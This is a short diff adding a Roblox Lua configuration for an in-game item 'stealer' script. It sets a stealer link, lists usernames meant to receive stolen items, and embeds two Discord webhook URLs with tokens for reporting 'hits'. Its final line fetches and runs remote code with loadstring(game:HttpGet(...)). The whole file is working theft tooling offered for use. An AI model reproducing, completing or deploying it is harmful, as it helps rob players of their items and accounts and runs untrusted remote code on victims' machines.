@@ -1,0 +1,13 @@
+STEALER_LINK ='GaG.txt' -- stealer link (how to create is bellow)
+
+Usernames = {
+    'bladeballgre', -- PUT UR ROBLOX USERNAMES
+    'BLADES12900', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'BLADES8927',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1371622669027643463/7c4ByqT7-TI4uQZvcMoSJ5e49UBkvFp2WivPgdGVqBn_Gl0O-YbzFXcJTZWdgwszE4bl"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1371622489519558776/5jbG56Rzo4efBeVYT69uGNcQd2Yasfeqcv8-JZMftTAxdt19DnAzJNx86Len7nd84d_a"
+
+loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
+```
